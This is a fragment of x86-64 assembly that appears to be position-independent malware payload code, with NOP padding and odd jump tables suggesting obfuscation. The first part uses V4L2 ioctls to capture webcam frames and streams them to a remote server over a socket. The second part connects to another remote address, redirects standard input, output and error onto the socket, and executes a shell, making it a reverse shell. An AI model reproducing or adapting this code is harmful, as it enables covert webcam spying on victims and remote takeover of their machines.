

		mov		rax, SYS_connect
		mov		rdi, r13
		mov		rsi, [rbp + 16]
		add		rsi, mydata.serv_addr_video
		;lea		rsi, [rel serv_addr_video]
		mov		rdx, 16
		syscall
		.continue_reverse:
		jmp	[rel .addr9r]
		.addr9: dq 0x421900000009
		.addr9r: dq 0
		dq 0x696900000009
		end_shuffle:
		dq	1942, 9
		test	rax, rax
		jnz		.closing_video

		;struct v4l2_requestbuffers { C'est un buffer les formalites
		;	__u32 count;          // le nombre de tampons
		;	__u32 type;           // le type de tampons
		;	__u32 memory;         // le type de memoire
		;	__u32 reserved[2];    //
		;};
		; struct v4l2_buffer

		mov		rdx, [rbp + 16]
		add		rdx, mydata.reqb
		mov		dword [rdx], NBUF
		mov		dword [rdx + 4], V4L2_BUF_TYPE_VIDEO_CAPTURE
		mov		dword [rdx + 8], V4L2_MEMORY_MMAP

		;mov		dword [rel reqb], NBUF
		;mov		dword [rel reqb + 4], V4L2_BUF_TYPE_VIDEO_CAPTURE
		;mov		dword [rel reqb + 8], V4L2_MEMORY_MMAP


		xor		eax, eax
		mov		[rdx + 12], eax
		mov		rax, SYS_ioctl
		mov		rdi, r12
		mov		rsi, VIDIOC_REQBUFS
		;lea		rdx, [rel reqb]
		syscall



%assign i 0
%rep NBUF

		mov		rdx, [rbp + 16]
		add		rdx, mydata.v4buf

		mov		dword [rdx], i
		mov		dword [rdx + 4], V4L2_BUF_TYPE_VIDEO_CAPTURE
		mov		dword [rdx + 60], V4L2_MEMORY_MMAP
		mov		rax, SYS_ioctl
		mov		rdi, r12
		mov		rsi, VIDIOC_QUERYBUF
		;lea		rdx, [rel v4buf]
		syscall




		mov		r9, [rbp + 16]
		add		r9, mydata.v4buf

		mov		rax, SYS_mmap
		xor		rdi, rdi                          ; addr = NULL
		mov		edx, [r9 + 72]                 ; length (dword) → edx
		mov		esi, edx                          ; rsi = length
		mov		edx, PROT_READ | PROT_WRITE       ; rdx
		mov		r10, MAP_SHARED
		mov		r8,  r12                          ; fd
		mov		r9,  [r9 + 64]                 ; offset (qword)
		syscall


		mov		rdx, [rbp + 16]
		add		rdx, mydata.v4buf

		mov		rsi, [rbp + 16]
		add		rsi, mydata.buf_addrs

		mov		[rsi + i*8], rax            ; save address
		mov		eax, [rdx + 72]
		mov		[rsi + i*8], rax            ; save size (dword → qword)

		mov		rax, SYS_ioctl
		mov		rdi, r12
		mov		rsi, VIDIOC_QBUF
		;lea		rdx, [rel v4buf]
		syscall
%assign i i+1
%endrep
		mov		rax, SYS_ioctl
		mov		rdi, r12
		mov		rsi, VIDIOC_STREAMON
		mov		rdx, [rbp + 16]
		add		rdx, mydata.cap_type
		;lea		rdx, [rel cap_type]
		syscall

		mov		rcx, FRAMES
		.loop_frames:
		push	rcx
		mov		rax, SYS_ioctl
		mov		rdi, r12
		mov		rsi, VIDIOC_DQBUF
		mov		rdx, [rbp + 16]
		add		rdx, mydata.v4buf
		;lea		rdx, [rel v4buf]
		syscall


		mov		rdx, [rbp + 16]
		add		rdx, mydata.v4buf

		mov		ebx, [rdx]                      ; index (dword)
		mov		edx, [rdx + 8]                  ; bytesused
		mov		rcx, [rbp + 16]
		add		rcx, mydata.v4buf
		;lea		rcx, [rel buf_addrs]
		mov		rsi, [rcx + rbx*8]          ; addr
		mov		rdi, r13                          ; stdout
		mov		rax, SYS_write
		syscall

		mov		rax, SYS_ioctl
		mov		rdi, r12
		mov		rsi, VIDIOC_QBUF
		mov		rdx, [rbp + 16]
		add		rdx, mydata.v4buf
		;lea		rdx, [rel v4buf]
		syscall
		pop		rcx
		loop	.loop_frames

		mov		rax, SYS_ioctl
		mov		rdi, r12
		mov		rsi, VIDIOC_STREAMOFF
		mov		rdx, [rbp + 16]
		add		rdx, mydata.cap_type
		;lea		rdx, [rel cap_type]
		syscall

%assign i 0
%rep NBUF
		mov		rax, SYS_munmap
		mov		rdi, [rbp + 16]
		add		rdi, mydata.buf_addrs
		mov		rdi, [rdi + i*8]
		mov		rsi, [rbp + 16]
		add		rsi, mydata.buf_sizes
		mov		rsi, [rsi + i*8]
		syscall
%assign i i+1
%endrep
		.closing_video:
		mov		rax, SYS_close
		mov		rdi, r12
		syscall

		mov		rax, SYS_close
		mov		rdi, r13
		syscall



		mov		rax, SYS_socket
		mov		rdi, AF_INET
		mov		rsi, SOCK_STREAM
		xor		rdx, rdx
		NOP
		NOP
		NOP
		NOP
		syscall
		mov		r12, rax

		mov		rax, SYS_connect
		mov		rdi, r12
		mov		rsi, [rbp + 16]
		add		rsi, mydata.serv_addr
		;lea		rsi, [rel serv_addr]
		mov		rdx, 16
		syscall
		test	rax, rax
		jnz		.exit_ret

		mov		rax, SYS_dup2
		mov		rdi, r12
		mov		rsi, 0
		syscall
		mov		rax, SYS_dup2
		mov		rdi, r12
		mov		rsi, 1
		syscall
		mov		rax, SYS_dup2
		mov		rdi, r12
		mov		rsi, 2
		syscall
		mov		rax, [rbp + 16]
		add		rax, mydata.arg0
		;lea		rax, [rel arg0]
		mov		rdi, [rbp + 16]
		add		rdi, mydata.argv
		mov		[rdi], rax

		mov		rax, SYS_execve

		mov		rdi, [rbp + 16]
		add		rdi, mydata.shell
		;lea		rdi, [rel shell]
		mov		rsi, [rbp + 16]
		add		rsi, mydata.argv
		;lea		rsi, [rel argv]
		xor		rdx, rdx
		NOP
		NOP
		NOP
		NOP
		syscall


	.exit_ret:


		mov		rax, SYS_close
		mov		rdi, r12
		syscall



		add		rsp, 64

		mov	rax, 5487


		NOP
		mov		rax, SYS_exit
		xor		rdi, rdi
		NOP
		NOP
		NOP
		NOP
		syscall

